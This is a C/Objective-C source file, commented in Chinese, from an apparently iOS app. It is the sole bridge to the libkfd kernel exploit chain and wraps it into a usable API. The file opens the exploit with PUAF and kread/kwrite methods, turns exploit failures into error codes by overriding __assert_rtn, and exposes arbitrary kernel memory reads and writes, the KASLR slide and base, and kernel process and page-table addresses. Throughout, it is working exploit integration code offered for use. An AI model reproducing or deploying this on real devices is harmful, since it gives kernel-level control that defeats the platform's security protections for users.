/*
 * MFKernelBridge.c —— 白米饭复刻 / KFD 内核链唯一入口
 * =============================================================
 * 【本文件是整个工程里唯一 include "libkfd.h" 的编译单元】
 *
 * 为什么必须唯一（见 docs/kfd-移植清单.md 第 1 节）：
 *   libkfd.h 是 header-only。里面的
 *     struct kfd* kfd_init(...)      libkfd.h L148
 *     void       kfd_free(...)       libkfd.h L158
 *     u64        kopen(...)          libkfd.h L167
 *     void       kread/kwrite/kclose libkfd.h L207/212/217
 *   以及 libkfd/info/dynamic_info.h 里的
 *     struct dynamic_info kern_versions[];   L34
 *   全都是【没有 static 的普通外部定义】。被两个 .c/.m 同时包含
 *   = 链接期 duplicate symbol。
 *
 *   kfund 上游自己的工程里，只有 fun/krw.m 一个 TU 包含它
 *   （kfd-Bridging-Header.h 只 include fun/{fun,krw}.h 和 fun/kpf/patchfinder.h，
 *    不含 libkfd.h）——这是读 kfd.xcodeproj/project.pbxproj 的
 *   PBXSourcesBuildPhase + 全树 grep 得到的事实，不是推测。
 *
 * 本文件的三件事：
 *   1. 把上游「断言失败 = sleep(30) + exit(1)」截获成
 *      「返回错误码 + 错误字符串」（longjmp 回 mf_kopen）。
 *   2. 导出 mf_* 一族纯 C 接口（见 MFKernelBridge.h）。
 *   3. 提供 MFLibkfdKRead4()，替代被丢弃的 fun/krw.m（供 libdimentio.m 用）。
 */

/* ── 公共接口头（纯 C，不含 libkfd.h）────────────────────────────── */
#include "MFKernelBridge.h"

/* [M5.87] proc patch 段用到 snprintf / memcpy：显式带上，不指望 libkfd 间接引入 */
#include <stdio.h>
#include <string.h>
#include <stddef.h>

/*
 * [M5.89] TF_PLATFORM 段直接调 task_for_pid / mach_port_deallocate。
 * 必须显式 include <mach/mach.h> —— libkfd 只是"碰巧"带进来一部分声明，
 * 不保证这两个可见。构建 #40 就是因为缺这个头报 undeclared identifier。
 */
#include <mach/mach.h>
#include <mach/mach_port.h>

/* ── libkfd 宿主支撑层（ffi: MFLibkfdKRead4 原型）────────────────── */
#include "MFLibkfdHost.h"

/* ── libkfd 配置开关：必须在 include libkfd.h 之前定义 ───────────────
 * CONFIG_ASSERT 必须保持 1：本桥接把断言改造成了可恢复失败
 *   （libkfd/common.h 的 assert 宏 -> mf_kfd_fail_hook）。
 * CONFIG_PRINT / CONFIG_TIMER 默认关掉：上游打开时会在
 *   krkw_helper_run_allocate 里逐页 print_buffer，在 App 里既卡又刷屏。
 *   调试时用 -DCONFIG_PRINT=1 -DCONFIG_TIMER=1 重新编译即可。
 *   （libkfd.h 已被 [MF PATCH 04] 加上 #ifndef 守卫。）
 */
#ifndef CONFIG_ASSERT
#define CONFIG_ASSERT 1
#endif
#ifndef CONFIG_PRINT
#define CONFIG_PRINT 0
#endif
#ifndef CONFIG_TIMER
#define CONFIG_TIMER 1
#endif

#include "kfd/libkfd.h"          /* ← 全工程唯一一处 */

/* ── fun/kpf 符号（无 fun/ 目录，仍需要这几个）────────────────────── */
#include "kfd/fun/kpf/patchfinder.h"

/* ── 标准库 ───────────────────────────────────────────────────── */
#include <errno.h>
#include <fcntl.h>       /* open / O_CREAT —— 给 mf_redirect_klog 用 */
#include <unistd.h>      /* dup2 / getpid */
#include <setjmp.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <sys/sysctl.h>
#include <unistd.h>

/* ================================================================ */
/* 内部状态                                                          */
/* ================================================================ */

/* libkfd 的句柄。0 = 未打开。 */
static struct kfd *g_kfd = NULL;

/* 失败跳转。mf_kopen 用 setjmp 落点，断言宏 longjmp 回来。 */
static jmp_buf g_fail_jmp;
static volatile int g_fail_armed = 0;

/* 诊断缓冲。 */
static char g_err[768];
static char g_site[192];
static char g_stage[512];
static int  g_verbose = 0;

#define MF_MARK_FAILED()  do { g_kfd = NULL; } while (0)

static void mf_strlcpy(char *dst, size_t cap, const char *src)
{
    if (cap == 0) return;
    if (src == NULL) src = "(null)";
    size_t n = strlen(src);
    if (n >= cap) n = cap - 1;
    memcpy(dst, src, n);
    dst[n] = '\0';
}

static void mf_set_stage(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(g_stage, sizeof(g_stage), fmt, ap);
    va_end(ap);
    if (g_verbose) fprintf(stderr, "[kfd] %s\n", g_stage);
}

/* ================================================================ */
/* 1) 失败钩子 —— 把上游的 exit(1) 变成可恢复的错误                 */
/* ================================================================ */

/* 正在跑的 kfd 实例，供失败钩子回收（[MF PATCH 08]）*/
static void *g_active_kfd = NULL;

/* 回收用的嵌套跳转点：kfd_free() 自己也可能断言 */
static jmp_buf g_cleanup_jmp;
static volatile int g_cleanup_armed = 0;

void mf_kfd_register_active(void *kfd)
{
    g_active_kfd = kfd;
}

/*
 * ★★ 为什么只能做「安全回收」（[MF PATCH 08b]，真机崩溃报告实锤）★★
 *
 * 第一版我在这里调的是 kfd_free()，想法是「把四样全还回去」。
 * 真机直接 SIGSEGV，两次，栈完全一致：
 *
 *     kopen → krkw_helper_free → kwrite_sem_open_free
 *           → kwrite_sem_open_deallocate → assert 失败
 *           → mf_kfd_fail_hook → mf_kfd_cleanup_active → kfd_free → 💥
 *
 * 原因：KFD 失败时初始化链是【断的】。以 kopen 的顺序为例 ——
 *     1. kfd_init   ✅
 *     2. puaf_run   ✅
 *     3. krkw_run   ❌ ← 失败点
 *     4. info_run   （没到）
 *     5. perf_run   （没到）
 * 对 3/4/5 调 free = 释放没建好的东西 → 断言 / 野指针。
 *
 * 所以改成只释放【确定成功过】的两样：
 *     · puaf_free —— 本分支成功过，上游重试路径也是这么调的
 *     · info_free —— info_init 在 kfd_init 里做过
 *
 * fd 泄漏不主动处理：失败后闸门会锁死不让重试（不叠加），
 * 用户退出 App 时所有 fd 由内核自动关闭 —— 比冒着崩溃风险去关安全得多。
 */
static void mf_kfd_cleanup_active(void)
{
    if (g_active_kfd == NULL) return;

    void *k = g_active_kfd;
    g_active_kfd = NULL;      /* 先摘掉，避免钩子重入时无限递归 */

    if (setjmp(g_cleanup_jmp) == 0) {
        g_cleanup_armed = 1;
        mf_kfd_safe_cleanup(k);
        g_cleanup_armed = 0;
        fprintf(stderr, "[mf] 🔧 安全回收完成（悬空页已归还；fd 由退出 App 兜底）\n");
    } else {
        g_cleanup_armed = 0;
        fprintf(stderr, "[mf] ⚠️ 回收过程中又踩断言 —— 已尽力，请重启 App\n");
    }
}

/*
 * 由 [MF PATCH 01] 打进 libkfd/common.h 的 assert 宏调用。
 * 上游行为：print -> sleep(30) -> exit(1)。
 * 现在：记录诊断 -> 尽力回收 ->（若已 armed）longjmp 回 mf_kopen。
 *
 * 若没有 armed（例如有人把 libkfd 单独拿去编译），退化为上游行为，
 * 不静默吞掉错误。
 */
void mf_kfd_fail_hook(const char *what, const char *file, int line)
{
    const char *base = (file != NULL) ? strrchr(file, '/') : NULL;
    base = (base != NULL) ? (base + 1) : file;

    snprintf(g_site, sizeof(g_site), "%s:%d", (base != NULL) ? base : "?", line);
    snprintf(g_err, sizeof(g_err), "assertion failed: (%s) at %s:%d",
             (what != NULL) ? what : "?", (base != NULL) ? base : "?", line);

    if (g_verbose) fprintf(stderr, "[kfd] 🔴 %s\n", g_err);

    /*
     * 回收阶段自己踩断言：跳回 cleanup 的落点，让 kfd_free 那条路收尾。
     * 不这么处理的话，cleanup 里的断言会一路走到 sleep(30)+exit(1)。
     */
    if (g_cleanup_armed) {
        g_cleanup_armed = 0;
        longjmp(g_cleanup_jmp, 1);
    }

    if (g_fail_armed) {
        g_fail_armed = 0;
        /* ★ 关键：先尽力回收，再跳走 —— 跳走之后就没机会了 */
        mf_kfd_cleanup_active();
        longjmp(g_fail_jmp, 1);
    }

    /* 无宿主接管：保持上游的可见失败行为。 */
    fprintf(stderr, "[kfd] no host handler, sleep(30) before exit(1)\n");
    sleep(30);
    exit(1);
}

/* ================================================================ */
/* 1b) __assert_rtn 兜底                                             */
/* ================================================================ */

/*
 * ★ 为什么需要这一层（真机崩溃报告实锤）：
 *
 *   [MF PATCH 01] 把 libkfd/common.h 的 assert 宏改成走 mf_kfd_fail_hook，
 *   但 <assert.h> 是【无 include guard 且内部会 #undef assert】的头文件。
 *   kread_sem_open.h 里 #include "libdimentio.h" / "patchfinder.h" 会拐进
 *   Foundation → <assert.h>，于是我们的宏被顶回系统版本。
 *
 *   结果（设备上的真实崩溃报告 FindMy-2026-10-15-115826.ips）：
 *     __assert_rtn -> abort
 *     kread_sem_open_allocate.cold.1   ← 卡在这里直接闪退
 *   而不是弹出可读的错误框。
 *
 *   修法：不从宏层拦，改从【符号层】拦。
 *   整个进程里所有 assert 失败都要经过 __assert_rtn，我们在这里接管。
 *   这是 libSystem 的公开 ABI 符号，本镜像内的引用会优先解析到我们的定义。
 */
void __assert_rtn(const char *func, const char *file, int line, const char *expr)
{
    (void)func;
    mf_kfd_fail_hook((expr != NULL) ? expr : "assert", file, line);

    /*
     * 走到这里说明钩子没 longjmp（g_fail_armed == 0，没人 setjmp 落点）。
     * 保持上游语义：真的中断，不静默吞错。
     */
    abort();
}

/* ================================================================ */
/* 1c) 把 kfd 内部的 printf 诊断重定向到文件                          */
/* ================================================================ */

static int g_klog_fd = -1;

/*
 * kfd 内部大量用 printf 输出诊断，形如：
 *     defeated kaslr, kbase: 0xfffffe0007...
 *     pfinder_init: success!
 *     cdevsw: 0x...
 *     gPhysBase: 0x...
 * 但 iOS 上 App 的 stdout 既不进 syslog、也没人接着 —— 失败时我们只
 * 看到最后那句 "run_kfd_patchfinder failed"，不知道它死在 9 个偏移里的哪一个。
 *
 * 这里把 stdout/stderr 重定向到沙盒里的 mf_kfd.log，
 * 界面「内核日志」页能读回来（见 mf_read_klog）。
 *
 * 只重定向一次；任何失败都静默 —— 日志不是关键路径。
 */
static void mf_redirect_klog(void)
{
    if (g_klog_fd >= 0) return;

    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES) firstObject];
    if (docs == nil) return;

    NSString *path = [docs stringByAppendingPathComponent:@"mf_kfd.log"];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) return;

    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    g_klog_fd = fd;

    printf("[mf] ==== kfd log opened  pid=%d  puaf/landa 前置日志 ====\n", getpid());
    fflush(stdout);
}

/* 读回内核日志（UI 用）。返回 malloc 的字符串，调用方 free；没有则 NULL。 */
char *mf_read_klog(void)
{
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES) firstObject];
    if (docs == nil) return NULL;

    NSString *path = [docs stringByAppendingPathComponent:@"mf_kfd.log"];
    NSData *d = [NSData dataWithContentsOfFile:path];
    if (d == nil || d.length == 0) return NULL;

    char *out = (char *)malloc(d.length + 1);
    if (out == NULL) return NULL;
    memcpy(out, d.bytes, d.length);
    out[d.length] = '\0';
    return out;
}

/* ================================================================ */
/* 2) 生命周期                                                       */
/* ================================================================ */

int mf_kopen(uint64_t puaf_pages, int puaf_method, int kread_method, int kwrite_method)
{
    /* 先把 kfd 内部的 printf 诊断接进文件，失败时才能看出死在 9 个偏移里的哪一个 */
    mf_redirect_klog();

    if (g_kfd != NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "already open (call mf_kclose first)");
        return -2;
    }

    /* 打开前自检：把上游的 assert 前置成显式错误，错误信息更友好。 */
    if (puaf_pages < MF_PUAF_PAGES_MIN || puaf_pages > MF_PUAF_PAGES_MAX) {
        snprintf(g_err, sizeof(g_err),
                 "bad puaf_pages: %llu (valid range %d..%d)",
                 (unsigned long long)puaf_pages, MF_PUAF_PAGES_MIN, MF_PUAF_PAGES_MAX);
        return -3;
    }
    if (puaf_method < MF_PUAF_PHYSPUPPET || puaf_method > MF_PUAF_LANDA) {
        snprintf(g_err, sizeof(g_err), "bad puaf_method: %d", puaf_method);
        return -3;
    }
    if (kread_method < MF_KREAD_KQUEUE_WORKLOOP_CTL || kread_method > MF_KREAD_SEM_OPEN) {
        snprintf(g_err, sizeof(g_err), "bad kread_method: %d", kread_method);
        return -3;
    }
    if (kwrite_method < MF_KWRITE_DUP || kwrite_method > MF_KWRITE_SEM_OPEN) {
        snprintf(g_err, sizeof(g_err), "bad kwrite_method: %d", kwrite_method);
        return -3;
    }
    /* krkw.h L77-79：kread_sem_open 必须配 kwrite_sem_open，上游用 assert 拦。 */
    if (kread_method == MF_KREAD_SEM_OPEN && kwrite_method != MF_KWRITE_SEM_OPEN) {
        mf_strlcpy(g_err, sizeof(g_err),
                   "kread_sem_open requires kwrite_sem_open (libkfd krkw.h assert)");
        return -3;
    }
    /* krkw.h L73-75：16.3+ 的 kqueue_workloop_ctl 已废。 */
    if (kread_method == MF_KREAD_KQUEUE_WORKLOOP_CTL) {
        mf_strlcpy(g_err, sizeof(g_err),
                   "kread_kqueue_workloop_ctl is disabled on iOS 16.3+ (libkfd krkw.h)");
        return -3;
    }

    mf_strlcpy(g_err, sizeof(g_err), "no error");

    mf_set_stage("kopen: start (puaf_pages=%llu, puaf_method=%d, kread=%d, kwrite=%d)",
                 (unsigned long long)puaf_pages, puaf_method, kread_method, kwrite_method);

    struct kfd *kfd = NULL;

    /*
     * setjmp 落点。libkfd 内部任何 assert 失败都会 longjmp 回到这里，
     * 于是「卡 30 秒闪退」变成「返回错误码」。
     */
    if (setjmp(g_fail_jmp) == 0) {
        g_fail_armed = 1;
        kfd = (struct kfd *)(uintptr_t)kopen(puaf_pages,
                                             (u64)puaf_method,
                                             (u64)kread_method,
                                             (u64)kwrite_method);
        g_fail_armed = 0;
    } else {
        /* 从 libkfd 内部跳回来：g_err / g_site 已由钩子填好。 */
        g_fail_armed = 0;
        MF_MARK_FAILED();
        mf_set_stage("kopen: FAILED (%s)", g_err);
        return -1;
    }

    if (kfd == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "kopen returned NULL");
        mf_set_stage("kopen: FAILED (kopen returned NULL)");
        return -1;
    }

    g_kfd = kfd;

    mf_set_stage("kopen: OK  kbase=0x%llx  kslide=0x%llx",
                 (unsigned long long)(ARM64_LINK_ADDR + (uint64_t)g_kfd->perf.kernel_slide),
                 (unsigned long long)g_kfd->perf.kernel_slide);

    if (g_verbose) {
        fprintf(stderr, "[kfd] kbase    = 0x%llx\n", (unsigned long long)mf_get_kbase());
        fprintf(stderr, "[kfd] kslide   = 0x%llx\n", (unsigned long long)mf_get_kslide());
        fprintf(stderr, "[kfd] kernproc = 0x%llx\n", (unsigned long long)g_kfd->info.kaddr.kernel_proc);
        fprintf(stderr, "[kfd] selfproc = 0x%llx\n", (unsigned long long)g_kfd->info.kaddr.current_proc);
    }

    return 0;
}

int mf_kopen_default(void)
{
    return mf_kopen(MF_DEFAULT_PUAF_PAGES,
                    MF_DEFAULT_PUAF_METHOD,
                    MF_DEFAULT_KREAD_METHOD,
                    MF_DEFAULT_KWRITE_METHOD);
}

void mf_kclose(void)
{
    if (g_kfd == NULL) {
        return;
    }

    /*
     * 清理路径同样可能断言失败（例如 perf_free 还原 si_rdev、关闭 fd）。
     * 用同一套 setjmp 兜住，避免用户点「关闭」时闪退。
     */
    if (setjmp(g_fail_jmp) == 0) {
        g_fail_armed = 1;
        kclose((u64)(uintptr_t)g_kfd);
        g_fail_armed = 0;
    } else {
        g_fail_armed = 0;
        mf_set_stage("kclose: FAILED (%s)", g_err);
        MF_MARK_FAILED();
        return;
    }

    MF_MARK_FAILED();
    mf_set_stage("kclose: done");
}

int mf_is_open(void)
{
    return (g_kfd != NULL) ? 1 : 0;
}

/* ================================================================ */
/* 3) 读写                                                           */
/* ================================================================ */

/*
 * ★★ kread/kwrite 的 size 必须是 8 的倍数 ★★
 *
 * 原因见 MFLibkfdKRead4 上方那段注释：
 *   kread 落到 kread_from_method(u64, ...)，
 *   type_size = size / sizeof(u64)。
 *   size < 8 或不是 8 的倍数时，尾数部分【会被静默丢弃】，
 *   甚至 size=4 时一次循环都不进（缓冲区原封不动）。
 *
 * 这是最阴的一类 bug：不报错、不崩溃，只是数据不对。
 * 所以这两个入口做兜底：把非 8 倍数的情况显式处理掉，绝不静默。
 */

/*
 * [M5.105] 内核地址硬闸 —— 放在唯一入口，而不是指望每个调用方自觉。
 *
 * arm64 内核地址的判据是「高 16 位全 1」。任何低于 0xffff000000000000 的地址
 * 一旦送进 kread/kwrite，内核会在 copyio.c:184 的 copy_validate 里直接 panic，
 * 整机重启。这个坑已经踩了两次：
 *     panic-full-2026-10-24-200013.ips   copy_validate(0x16b8bcfb8, -1, 8)
 *     panic-full-2026-10-24-235009.ips   copy_validate(0x16d882c68, -1, 8)
 * 两次都是 8 字节读、kaddr 是用户地址。
 *
 * 所以：非法地址不发 syscall，只记账 + 返回错误。
 */
static uint64_t g_mf_denied_kaddr;
static int      g_mf_denied_count;

static int mf_addr_guard(uint64_t kaddr, uint64_t size, const char *who)
{
    if (kaddr < 0xffff000000000000ULL ||
        size > (1ULL << 28) ||
        kaddr > 0xffffffffffffffffULL - size) {
        g_mf_denied_kaddr = kaddr;
        g_mf_denied_count++;
        snprintf(g_err, sizeof(g_err),
                 "%s: refused non-kernel address %#llx (size %llu, denied=%d)",
                 who, (unsigned long long)kaddr,
                 (unsigned long long)size, g_mf_denied_count);
        return -1;
    }
    return 0;
}

int mf_kaddr_denied_count(void)
{
    return g_mf_denied_count;
}

uint64_t mf_kaddr_denied_last(void)
{
    return g_mf_denied_kaddr;
}

/*
 * 当前 pmap 的 TTBR 快照。kfd 的 perf_run() 会把 TTBR0/TTBR1 的 (pa, va)
 * 都存进 kfd->perf.ttbr[]，这是内核给的【可信】页表根；用它翻译自己的
 * 用户地址，才能验证页表遍历本身是对的，而不是拿堆里的随机字段去试。
 */
int mf_ttbr_snapshot(uint64_t *ttbr0_pa, uint64_t *ttbr0_va,
                     uint64_t *ttbr1_pa, uint64_t *ttbr1_va)
{
    if (g_kfd == NULL) {
        return -1;
    }
    if (ttbr0_pa) *ttbr0_pa = (uint64_t)g_kfd->perf.ttbr[0].pa;
    if (ttbr0_va) *ttbr0_va = (uint64_t)g_kfd->perf.ttbr[0].va;
    if (ttbr1_pa) *ttbr1_pa = (uint64_t)g_kfd->perf.ttbr[1].pa;
    if (ttbr1_va) *ttbr1_va = (uint64_t)g_kfd->perf.ttbr[1].va;
    return 0;
}

int mf_kread(uint64_t kaddr, void *uaddr, uint64_t size)
{
    if (g_kfd == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kread: not open");
        return -1;
    }
    if (mf_addr_guard(kaddr, size, "mf_kread") != 0) {
        return -1;
    }
    if (uaddr == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kread: uaddr is NULL");
        return -2;
    }
    if (size == 0) {
        return 0;
    }

    /* 整 8 字节：直接走后端，最快 */
    if ((size & 7u) == 0) {
        if (setjmp(g_fail_jmp) == 0) {
            g_fail_armed = 1;
            kread((u64)(uintptr_t)g_kfd, kaddr, uaddr, size);
            g_fail_armed = 0;
        } else {
            g_fail_armed = 0;
            return -1;
        }
        return 0;
    }

    /*
     * 非 8 倍数：按【8 字节对齐单元】逐块读。
     *
     * ★ 审查修正（报告 S3）：第一版是 kread(kaddr+done, 8)，
     *   size=12 时会读到 kaddr+8..kaddr+16，比请求范围多读 4 字节，
     *   贴着页尾时可能跨页。改成先把地址对齐到 8 字节再读，
     *   然后按 shift 截取 —— 每次读都落在单个 8 字节单元内。
     */
    unsigned char *out = (unsigned char *)uaddr;
    uint64_t done = 0;
    while (done < size) {
        uint64_t addr    = kaddr + done;
        uint64_t aligned = addr & ~7ULL;
        uint64_t shift   = addr - aligned;          // 0..7

        uint64_t chunk = 0;
        if (setjmp(g_fail_jmp) == 0) {
            g_fail_armed = 1;
            kread((u64)(uintptr_t)g_kfd, aligned, &chunk, sizeof(chunk));
            g_fail_armed = 0;
        } else {
            g_fail_armed = 0;
            if (g_verbose) {
                fprintf(stderr, "[mf] mf_kread: 分块读失败 @ done=%llu/%llu\n",
                        (unsigned long long)done, (unsigned long long)size);
            }
            return -1;
        }

        uint64_t avail = 8 - shift;
        uint64_t take  = (size - done < avail) ? (size - done) : avail;
        memcpy(out + done, ((unsigned char *)&chunk) + shift, (size_t)take);
        done += take;
    }
    return 0;
}

int mf_kwrite(void *uaddr, uint64_t kaddr, uint64_t size)
{
    if (mf_addr_guard(kaddr, size, "mf_kwrite") != 0) {
        return -1;
    }
    if (g_kfd == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kwrite: not open");
        return -1;
    }
    if (uaddr == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kwrite: uaddr is NULL");
        return -2;
    }
    if (size == 0) {
        return 0;
    }

    /*
     * ★ 审查修正（报告 S1）：上游 kwrite 后端有三条【静默 return】：
     *       new_value == 0   → 什么都不做
     *       old_value == 0   → 什么都不做（旧的为 0 也写不进去）
     *       old_value == new → 跳过
     *   而 kwrite() 返回 void —— 调用方根本看不出「其实没写」。
     *   我们的封装以前恒返回 0（成功），等于骗调用者。
     *
     *   现在加两道：
     *     ① 要写的数据全是 0 → 直接报错（这个上游铁定写不进去）
     *     ② 写完读回校验，不一致就报错
     */
    {
        const unsigned char *p = (const unsigned char *)uaddr;
        int allzero = 1;
        for (uint64_t i = 0; i < size; i++) {
            if (p[i] != 0) { allzero = 0; break; }
        }
        if (allzero) {
            mf_strlcpy(g_err, sizeof(g_err),
                       "mf_kwrite: 上游 kwrite 无法写 0（值靠 fd 槽表达）"
                       "—— 请改用非零哨兵、改指针，或改上层字段");
            return -3;
        }
    }

    /* 整 8 字节：直接写 */
    if ((size & 7u) == 0) {
        if (setjmp(g_fail_jmp) == 0) {
            g_fail_armed = 1;
            kwrite((u64)(uintptr_t)g_kfd, uaddr, kaddr, size);
            g_fail_armed = 0;
        } else {
            g_fail_armed = 0;
            return -1;
        }

        /* 读回校验（只对小尺寸做，避免大块写的额外开销） */
        if (size <= 64) {
            unsigned char back[64] = {0};
            if (mf_kread(kaddr, back, size) == 0 &&
                memcmp(back, uaddr, (size_t)size) != 0) {
                mf_strlcpy(g_err, sizeof(g_err),
                           "mf_kwrite: 写后校验不一致 —— 上游很可能静默跳过了"
                           "（值不变 / 目标原为 0 / 值为 0）");
                return -4;
            }
        }
        return 0;
    }

    /*
     * 非 8 倍数：读-改-写。
     * kwrite 后端是按 8 字节对象表达的，直接截断写会把尾部清零。
     * 所以先读回原 8 字节，只替换要改的字节，再整体写回。
     *
     * 注意：若目标原本是 0（kwrite 写 0 是上游已知的限制），
     *       这里会读回 0 再写回 0，可能失败 —— 如实返回错误。
     */
    unsigned char *in = (unsigned char *)uaddr;
    uint64_t done = 0;
    while (done < size) {
        uint64_t chunk = 0;
        uint64_t take = size - done;
        if (take > 8) take = 8;

        int partial = (take < 8);

        if (setjmp(g_fail_jmp) == 0) {
            g_fail_armed = 1;
            if (partial) {
                /* 先读回，再局部覆盖 */
                kread((u64)(uintptr_t)g_kfd, kaddr + done, &chunk, sizeof(chunk));
            }
            memcpy(&chunk, in + done, (size_t)take);
            kwrite((u64)(uintptr_t)g_kfd, &chunk, kaddr + done, sizeof(chunk));
            g_fail_armed = 0;
        } else {
            g_fail_armed = 0;
            if (g_verbose) {
                fprintf(stderr, "[mf] mf_kwrite: 非8倍数分块写失败 @ done=%llu/%llu (partial=%d)\n",
                        (unsigned long long)done, (unsigned long long)size, partial);
            }
            return -1;
        }
        done += take;
    }
    return 0;
}

/*
 * 4 字节对齐读。走 libkfd/krkw/kread/kread_sem_open.h 的
 * kread_sem_open_kread_u32()：它把 pinfo 指到 kaddr - offsetof(pseminfo, psem_usecount)，
 * 保证那 4 字节是被修改指针读到的【头 4 字节】，不会下溢到上一页。
 *
 * 注意：该函数要求当前 kread 后端确实是 sem_open；否则退回普通 kread。
 */
int mf_kread32(uint64_t kaddr, uint32_t *out)
{
    if (mf_addr_guard(kaddr, 4, "mf_kread32") != 0) {
        return -1;
    }
    if (g_kfd == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kread32: not open");
        return -1;
    }
    if (out == NULL) {
        return -2;
    }

    if (setjmp(g_fail_jmp) == 0) {
        g_fail_armed = 1;
        if (g_kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
            *out = kread_sem_open_kread_u32(g_kfd, kaddr);
        } else {
            /*
             * 兜底分支：读 8 字节再截断。
             * 【不能】写成 kread(..., sizeof(uint32_t)) —— size=4 会让
             * kread_from_method 的 type_size 算成 0，缓冲区原封不动。
             */
            uint64_t chunk = 0;
            kread((u64)(uintptr_t)g_kfd, kaddr, &chunk, sizeof(chunk));
            *out = (uint32_t)(chunk & 0xFFFFFFFFu);
        }
        g_fail_armed = 0;
    } else {
        g_fail_armed = 0;
        return -1;
    }
    return 0;
}

int mf_kread64(uint64_t kaddr, uint64_t *out)
{
    if (mf_addr_guard(kaddr, 8, "mf_kread64") != 0) {
        return -1;
    }
    if (g_kfd == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kread64: not open");
        return -1;
    }
    if (out == NULL) {
        return -2;
    }

    if (setjmp(g_fail_jmp) == 0) {
        g_fail_armed = 1;
        kread((u64)(uintptr_t)g_kfd, kaddr, out, sizeof(*out));
        g_fail_armed = 0;
    } else {
        g_fail_armed = 0;
        return -1;
    }
    return 0;
}

/*
 * 32 位写。上游 kwrite 不能写 0（writeups/exploiting-puafs.md L189-192）；
 * 这里把「整 8 字节槽」读回来拼装，只有目标字段被替换，其余保留。
 */
int mf_kwrite32(uint64_t kaddr, uint32_t value)
{
    if (mf_addr_guard(kaddr, 4, "mf_kwrite32") != 0) {
        return -1;
    }
    if (g_kfd == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kwrite32: not open");
        return -1;
    }

    uint64_t slot = 0;
    uint64_t aligned = kaddr & ~0x7ULL;
    int shift = (int)((kaddr - aligned) * 8);

    if (mf_kread64(aligned, &slot) != 0) {
        return -1;
    }
    slot = (slot & ~(0xffffffffULL << shift)) | (((uint64_t)value) << shift);

    if (setjmp(g_fail_jmp) == 0) {
        g_fail_armed = 1;
        kwrite((u64)(uintptr_t)g_kfd, &slot, aligned, sizeof(slot));
        g_fail_armed = 0;
    } else {
        g_fail_armed = 0;
        return -1;
    }
    return 0;
}

int mf_kwrite64(uint64_t kaddr, uint64_t value)
{
    if (mf_addr_guard(kaddr, 8, "mf_kwrite64") != 0) {
        return -1;
    }
    if (g_kfd == NULL) {
        mf_strlcpy(g_err, sizeof(g_err), "mf_kwrite64: not open");
        return -1;
    }

    if (setjmp(g_fail_jmp) == 0) {
        g_fail_armed = 1;
        kwrite((u64)(uintptr_t)g_kfd, &value, kaddr, sizeof(value));
        g_fail_armed = 0;
    } else {
        g_fail_armed = 0;
        return -1;
    }
    return 0;
}

/* ================================================================ */
/* 4) 地址信息                                                       */
/* ================================================================ */

uint64_t mf_get_kbase(void)
{
    if (g_kfd == NULL) {
        return 0;
    }
    /*
     * libkfd 的 struct perf 只存 kernel_slide（perf.h L109）。
     * ARM64_LINK_ADDR 在 kfund 里已是运行时变量（static_info.h L12-13，
     * 由 info_init 用 get_vm_kernel_link_addr() 赋值）。
     */
    return ARM64_LINK_ADDR + (uint64_t)g_kfd->perf.kernel_slide;
}

/*
 * 内核关键地址快照 —— 给 MFCalibrate 用。
 *
 * 只做「哪个字段」，不做任何推断；地址语义（是 proc/task/map/pmap）
 * 由 libkfd 的 info_run() 在打开内核时填好，这里原样交出。
 * 外部（校准代码）会先校验每个地址落在内核 VA 域再使用。
 */
int mf_kaddr_snapshot(uint64_t *kernel_proc, uint64_t *kernel_task,
                      uint64_t *current_proc, uint64_t *current_task,
                      uint64_t *current_map, uint64_t *current_pmap,
                      uint64_t *gVirtBase, uint64_t *gPhysBase,
                      uint64_t *gPhysSize)
{
    if (g_kfd == NULL) {
        return -1;
    }
    if (kernel_proc)  *kernel_proc  = (uint64_t)g_kfd->info.kaddr.kernel_proc;
    if (kernel_task)  *kernel_task  = (uint64_t)g_kfd->info.kaddr.kernel_task;
    if (current_proc) *current_proc = (uint64_t)g_kfd->info.kaddr.current_proc;
    if (current_task) *current_task = (uint64_t)g_kfd->info.kaddr.current_task;
    if (current_map)  *current_map  = (uint64_t)g_kfd->info.kaddr.current_map;
    if (current_pmap) *current_pmap = (uint64_t)g_kfd->info.kaddr.current_pmap;
    if (gVirtBase)    *gVirtBase    = (uint64_t)g_kfd->perf.gVirtBase;
    if (gPhysBase)    *gPhysBase    = (uint64_t)g_kfd->perf.gPhysBase;
    if (gPhysSize)    *gPhysSize    = (uint64_t)g_kfd->perf.gPhysSize;
    return 0;
}

uint64_t mf_get_kslide(void)
{
    if (g_kfd == NULL) {
        return 0;
    }
    return (uint64_t)g_kfd->perf.kernel_slide;
}

uint64_t mf_get_vm_kernel_link_addr(void)
{
    /* 由 kpf/patchfinder.m 实现：T8103/T8112 -> 0xFFFFFE0007004000。 */
    return (uint64_t)get_vm_kernel_link_addr();
}

const char *mf_kernel_version(void)
{
    /*
     * 缓存：上游 get_kernversion() 每次 strdup（patchfinder.m L120），
     * UI 频繁轮询会漏内存，所以这里只取一次。
     */
    static char cached[512];
    static int  cached_ok = 0;

    if (!cached_ok) {
        const char *v = get_kernversion();
        if (v != NULL && v[0] != '\0') {
            mf_strlcpy(cached, sizeof(cached), v);
            cached_ok = 1;
        } else {
            /* 兜底：直接 sysctl，不依赖 patchfinder。 */
            char buf[512] = {};
            size_t sz = sizeof(buf);
            if (sysctlbyname("kern.version", buf, &sz, NULL, 0) == 0 && buf[0] != '\0') {
                mf_strlcpy(cached, sizeof(cached), buf);
                cached_ok = 1;
            }
        }
    }
    return cached;
}

